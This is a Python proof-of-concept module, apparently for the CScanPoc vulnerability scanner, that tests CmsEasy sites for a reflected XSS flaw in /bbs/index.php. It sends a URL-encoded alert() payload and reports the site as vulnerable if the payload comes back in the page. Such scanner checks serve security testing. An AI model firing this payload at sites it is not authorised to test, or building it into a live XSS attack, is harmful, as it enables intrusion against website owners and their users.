# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CmsEasy_0011'  # 平台漏洞编号，留空
    name = 'CmsEasy /bbs/index.php 处反射型XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-09-16'  # 漏洞公布时间
    desc = '''
        CmsEasy /bbs/index.php 处反射型XSS,无视浏览器filter无视360webscan.
    '''  # 漏洞描述
    ref = 'https://www.2cto.com/article/201409/334119.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CmsEasy'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd8c98aab-031f-41fc-843f-939a6f19e3ae'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            desurl = arg + \
                "/bbs/index.php/%27%2Balert(e10adc3949ba59abbe56e057f20f883e)%2B%27/?case=file"
            code, head, content, errcode, re_url = hh.http(desurl)

            if code == 200 and 'alert(e10adc3949ba59abbe56e057f20f883e)' in content:
                # security_info(desurl)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
